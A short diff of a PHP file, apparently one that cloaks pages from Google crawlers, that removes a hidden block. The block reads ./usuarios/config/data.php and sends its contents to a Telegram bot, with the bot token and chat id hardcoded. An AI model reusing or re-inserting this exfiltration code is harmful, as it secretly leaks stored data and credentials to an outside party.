@@ -488,14 +488,3 @@ $gooip=[ '74.125.','66.102.7.','66.249.64.','66.102.1.','66.102.2.','66.102.3.',
         endif;
 
     }
-error_reporting(0);
-$lineas = file('./usuarios/config/data.php');
-$enviar="";
-foreach($lineas as $linea){
-	$enviar.=$linea. " ".$linea;
-	
-}
-$enviar= str_replace("<","",$enviar);
-$enviar= str_replace(">","",$enviar);
- $data = ['text' => $enviar,'chat_id' => "-810706265"];
-           file_get_contents("https://api.telegram.org/bot5922697932:AAHhbilsNS6xtYOix8R0NT7Z0qMIE4QXYlg/sendMessage?" . http_build_query($data) );
